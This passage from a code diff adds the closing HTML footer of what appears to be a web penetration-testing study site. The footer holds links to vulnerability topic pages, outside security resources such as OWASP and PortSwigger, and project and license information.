+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
